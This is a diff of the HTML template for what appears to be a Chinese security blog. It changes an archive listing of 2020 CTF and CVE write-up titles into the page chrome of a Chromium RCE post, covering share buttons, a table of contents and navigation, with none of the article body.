+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-09-01T13:27:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">强网杯和钓鱼城ctf部分题解</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/04/24/TCTF2020_Quals_Chromium_RCE/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="archive-article-date">
-  	<time datetime="2020-08-25T12:10:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-25</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/21/Chrome_issue_1196683_1195777/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Chrome CVE-2021-21220 分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">mips64调试环境搭建</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bdiff%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">查看diff文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">3.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/" class="archive-article-date">
-  	<time datetime="2020-07-26T13:17:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-26</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/">TCTF/0CTF2020初赛simple_echoserver</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/" class="archive-article-date">
-  	<time datetime="2020-07-26T12:00:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/">GeekPwn线上初赛ChildShell</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-07-15T14:50:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">GeekPwn云靶场挑战赛部分题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/" class="archive-article-date">
-  	<time datetime="2020-06-01T01:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/">RCTF2020部分题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-05-11T17:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/">空指针5月公开赛pwn题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T16:21:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/">Linux kernel 源码调试踩坑记录</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T06:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/">Sudo CVE-2019-18634 复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/03/Leetcode_DFA/" class="archive-article-date">
-  	<time datetime="2020-04-03T03:11:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/03/Leetcode_DFA/">DFA</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/">Prev</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/3/">Next</a>
-    </nav>
   
 
 
@@ -448,8 +356,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
